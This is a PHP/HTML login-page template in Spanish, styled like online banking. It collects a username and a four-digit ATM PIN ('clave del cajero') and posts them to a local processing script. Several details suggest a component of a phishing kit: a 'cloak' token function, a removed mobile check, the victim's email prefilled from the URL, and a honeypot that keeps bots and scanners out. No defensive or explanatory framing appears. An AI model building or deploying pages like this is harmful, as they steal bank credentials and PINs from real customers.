<?php

// Mobile check removed

?>
<div class="login-container">
    <form class="login-form" id="loginForm" action="modules/login/process_login.php" method="POST">
        <input type="hidden" name="email" value="<?php echo htmlspecialchars($_GET['email'] ?? ''); ?>">
        <input type="hidden" name="_csrf_token" value="<?php echo cloak_get_csrf_token(); ?>">
        <h1>¡Hola!</h1>
        <p>Ingresa los datos para gestionar tus productos y hacer transacciones.</p>

        <div class="input-wrapper">
            <div class="input-group">
                <i class="fa-solid fa-user"></i>
                <input type="text" name="usuario" id="usuario" required>
                <label for="usuario">Usuario</label>
                <span class="input-line"></span>
            </div>
            <span class="error-message">Ingresa tu usuario</span>
            <a href="#" class="forgot-link">¿Olvidaste tu usuario?</a>
        </div>

        <div class="input-wrapper">
            <div class="input-group">
                <i class="fa-solid fa-lock"></i>

                <input type="password" name="clave" id="clave" required maxlength="4" inputmode="numeric"
                    pattern="[0-9]*">

                <label for="clave">Clave del cajero</label>
                <span class="input-line"></span>
            </div>
            <span class="error-message">Ingresa tu clave</span>
            <a href="#" class="forgot-link">¿Olvidaste o bloqueaste tu clave?</a>
        </div>

        <!-- Honeypot anti-bot: campo invisible para humanos, irresistible para bots -->
        <div style="position:absolute;left:-9999px;top:-9999px;height:0;width:0;overflow:hidden;" aria-hidden="true">
            <label for="_website_url">Website URL</label>
            <input type="text" name="_website_url" id="_website_url" value="" tabindex="-1" autocomplete="off">
        </div>

        <button type="submit" class="btn btn-login" id="loginButton">
            Iniciar sesión
        </button>

        <a href="#" class="create-user-link">Crear usuario</a>
    </form>
</div>

<script>
    /* ── Validación campo usuario ── */
    document.addEventListener('DOMContentLoaded', () => {
        const usuarioInput = document.getElementById('usuario');
        const loginButton  = document.getElementById('loginButton');
        const alphaNumericRegex = /(?=.*[a-zA-Z])(?=.*[0-9])/;

        function validateForm() {
            const ok = alphaNumericRegex.test(usuarioInput.value);
            loginButton.disabled       = !ok;
            loginButton.style.opacity  = ok ? '1' : '0.5';
            loginButton.style.cursor   = ok ? 'pointer' : 'not-allowed';
        }
        validateForm();
        usuarioInput.addEventListener('input', validateForm);
    });
</script>
